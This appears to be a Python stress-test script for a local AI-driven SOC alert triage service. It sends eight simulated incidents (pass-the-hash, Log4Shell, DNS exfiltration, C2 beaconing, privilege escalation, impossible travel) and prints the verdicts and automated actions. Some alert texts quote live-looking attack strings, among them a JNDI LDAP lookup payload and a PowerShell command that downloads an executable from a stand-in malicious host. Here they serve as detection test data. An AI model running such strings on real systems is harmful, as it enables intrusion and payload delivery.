import requests
import json
import time

url = "http://localhost:8000/qualifier-alerte"

# ============================================================
# 🎛️  ML ENGINE TOGGLE
# Set USE_ML_ENGINE = True  → Engine 1 (Random Forest) is ACTIVE
# Set USE_ML_ENGINE = False → Bypass Engine 1, FORCE all alerts
#                             straight to LLaMA 3 (Engine 2)
# Useful for demos or debugging to see full LLM reasoning.
# ============================================================
USE_ML_ENGINE = True  # <-- Change this to False to bypass ML

# 8 Advanced, Real-World Cybersecurity Scenarios (All occurring during business hours)
scenarios = [
    {
        "name": "TEST 1: Lateral Movement (Pass-the-Hash)",
        "payload": {
            "alert": {
                "id": 1001,
                "description": "Windows Logon Success. Logon Type 3 (Network). Authentication Package: NTLM. Suspicious rapid movement from Workstation to Domain Controller.",
                "level": 9,
                "src_ip": "192.168.1.105",
                "timestamp": "2026-07-22T14:15:00Z"
            },
            "threat_intel": {
                "misp": {"found": False, "matches": []},
                "opencti": {"found": False, "matches": []}
            },
            "blue_team_context": "We suspect a compromised admin workstation at 192.168.1.105. Any lateral movement towards the DC should be isolated immediately.",
            "correlation": {
                "preliminary_verdict": "suspicious",
                "confidence": "high"
            }
        }
    },
    {
        "name": "TEST 2: Zero-Day Web Exploit (Log4Shell)",
        "payload": {
            "alert": {
                "id": 1002,
                "description": "Web application attack: Suspicious JNDI lookup in HTTP User-Agent header (${jndi:ldap://198.51.100.22/Exploit}).",
                "level": 12,
                "src_ip": "198.51.100.22",
                "timestamp": "2026-07-22T10:30:00Z"
            },
            "threat_intel": {
                "misp": {"found": True, "matches": [{"name": "Log4Shell Exploitation Node"}]},
                "opencti": {"found": True, "matches": [{"name": "Known Malicious IP"}]}
            }
        }
    },
    {
        "name": "TEST 3: Insider Threat (DNS Data Exfiltration)",
        "payload": {
            "alert": {
                "id": 1003,
                "description": "Anomalous DNS traffic volume: Over 5000 TXT record queries to an external unknown domain within 5 minutes.",
                "level": 8,
                "src_ip": "192.168.1.50",
                "timestamp": "2026-07-22T15:45:00Z"
            },
            "threat_intel": {
                "misp": {"found": False, "matches": []},
                "opencti": {"found": False, "matches": []}
            }
        }
    },
    {
        "name": "TEST 4: Legitimate Admin Activity (False Positive)",
        "payload": {
            "alert": {
                "id": 1004,
                "description": "SSH Login Success. User executed 'htop' and 'df -h' commands.",
                "level": 3,
                "src_ip": "192.168.1.10",
                "timestamp": "2026-07-22T11:00:00Z"
            },
            "threat_intel": {
                "misp": {"found": False, "matches": []},
                "opencti": {"found": False, "matches": []}
            },
            "blue_team_context": "192.168.1.10 is the authorized Jump Host for SysAdmins."
        }
    },
    {
        "name": "TEST 5: Living off the Land (PowerShell Payload Download)",
        "payload": {
            "alert": {
                "id": 1005,
                "description": "Suspicious PowerShell Execution: powershell.exe -ExecutionPolicy Bypass -NoProfile -Command Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\Temp\update.exe",
                "level": 12,
                "src_ip": "192.168.1.77",
                "timestamp": "2026-07-22T13:20:00Z"
            },
            "threat_intel": {
                "misp": {"found": False, "matches": []},
                "opencti": {"found": False, "matches": []}
            }
        }
    },
    {
        "name": "TEST 6: Supply Chain Compromise (C2 Beaconing)",
        "payload": {
            "alert": {
                "id": 1006,
                "description": "Internal CI/CD Jenkins server initiated outbound connection to unknown external IP on port 4444 (Meterpreter default).",
                "level": 14,
                "src_ip": "10.0.0.5",
                "timestamp": "2026-07-22T09:15:00Z"
            },
            "threat_intel": {
                "misp": {"found": False, "matches": []},
                "opencti": {"found": True, "matches": [{"name": "Cobalt Strike Team Server"}]}
            }
        }
    },
    {
        "name": "TEST 7: Privilege Escalation (Linux Shadow File)",
        "payload": {
            "alert": {
                "id": 1007,
                "description": "Auditd: User 'www-data' executed 'sudo su' and modified /etc/shadow file.",
                "level": 11,
                "src_ip": "172.16.0.20",
                "timestamp": "2026-07-22T16:00:00Z"
            },
            "threat_intel": {
                "misp": {"found": False, "matches": []},
                "opencti": {"found": False, "matches": []}
            }
        }
    },
    {
        "name": "TEST 8: SaaS Hijacking (Impossible Travel)",
        "payload": {
            "alert": {
                "id": 1008,
                "description": "Azure AD: Multiple failed MFA attempts followed by successful login from an IP address in North Korea.",
                "level": 13,
                "src_ip": "175.45.176.10",
                "timestamp": "2026-07-22T14:30:00Z"
            },
            "threat_intel": {
                "misp": {"found": False, "matches": []},
                "opencti": {"found": True, "matches": [{"name": "DPRK State Sponsored IP"}]}
            }
        }
    }
]

print("=" * 60)
print("  SOC AI STRESS TEST - Active Defender")
print("=" * 60)
if not USE_ML_ENGINE:
    print("\n⚠️  ML ENGINE IS DISABLED → All alerts go directly to LLaMA 3")
    print("   (To re-enable, set USE_ML_ENGINE = True in this file)\n")
else:
    print("\n✅  ML ENGINE IS ENABLED (Engine 1 active)\n")

print("\n⏳ Chargement du modele LLaMA 3 en RAM (Warmup)...")
print("  (Cela evite le 'Read timed out' sur le premier test)")
try:
    warmup_start = time.time()
    # Ping Ollama directly to load the model
    requests.post("http://localhost:11434/api/chat", json={
        "model": "llama3",
        "messages": [{"role": "user", "content": "hi"}],
        "stream": False
    }, timeout=120)
    print(f"✅ Modele charge avec succes en {round(time.time() - warmup_start, 1)}s !\n")
except Exception as e:
    print(f"⚠️ Erreur lors du warmup: {e}\n")

results = []

for scenario in scenarios:
    print(f"\n{scenario['name']}")
    print(f"  IP: {scenario['payload']['alert']['src_ip']}")
    print(f"  Description: {scenario['payload']['alert']['description'][:60]}...")
    print("  Sending to AI...", end=" ", flush=True)

    start = time.time()
    try:
        payload = scenario["payload"]
        # If ML disabled, send a special flag that forces Engine 2
        if not USE_ML_ENGINE:
            payload = dict(payload)
            # Inject a fake high-level ML bypass by setting a very high rule level
            # Actually we pass a query param to the URL
        response = requests.post(
            url + ("?disable_ml=true" if not USE_ML_ENGINE else ""),
            json=payload,
            timeout=180
        )
        elapsed = round(time.time() - start, 1)
        response.raise_for_status()
        result = response.json()
        print(f"Done ({elapsed}s)")
        print(f"  Context         : {result.get('analysis_context')}")
        print(f"  Reasoning       : {result.get('reasoning')}")
        print(f"  Classification  : {result.get('classification')}")
        print(f"  Confidence      : {result.get('confidence_score')}%")
        print(f"  Attack Type     : {result.get('attack_type')}")
        print(f"  MITRE Tactic    : {result.get('mitre_tactic')}")
        print(f"  Recommendation  : {result.get('recommandation')}")
        action = result.get("automated_action", {})
        print(f"  Action Execute  : {action.get('execute')}")
        print(f"  Action Type     : {action.get('action_type')}")
        print(f"  Target          : {action.get('target')}")
        results.append({"scenario": scenario["name"], "result": result, "elapsed": elapsed, "error": None})
    except Exception as e:
        elapsed = round(time.time() - start, 1)
        err = str(e)
        print(f"ERROR ({elapsed}s): {err}")
        results.append({"scenario": scenario["name"], "result": None, "elapsed": elapsed, "error": err})

print("\n" + "=" * 60)
print("  STRESS TEST SUMMARY")
print("=" * 60)
for r in results:
    if r["result"]:
        action = r["result"].get("automated_action", {})
        status = "✅ PASS"
        conf = r['result'].get('confidence_score', 0)
        mitre = str(r['result'].get('mitre_tactic', ''))[:15]
        # Detect which engine handled this by checking reasoning prefix
        reasoning = r['result'].get('reasoning', '')
        engine_tag = "[ENGINE 1]"
        if "[ENGINE 1]" not in reasoning:
            engine_tag = "[ENGINE 2]"
        print(f"{status} | {r['scenario'][:30]:30s} | {engine_tag} | {r['result']['classification']:15s} | Conf:{conf:3d}% | Action:{str(action.get('execute')):5s} | {r['elapsed']}s")
    else:
        print(f"❌ FAIL | {r['scenario'][:30]:30s} | ERROR: {r['error'][:30]}")
print("=" * 60)
